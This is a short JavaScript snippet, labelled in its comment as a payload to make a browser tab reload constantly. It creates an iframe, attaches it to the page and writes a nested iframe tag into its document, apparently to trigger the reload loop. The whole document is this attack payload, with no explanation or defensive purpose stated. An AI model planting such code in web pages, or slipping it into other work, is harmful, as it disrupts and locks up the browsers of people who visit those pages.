// Payload to cause the tab to constantly reload

const iframe = document.createElement("iframe");
document.body.appendChild(iframe);
iframe.contentDocument.write("<iframe>");
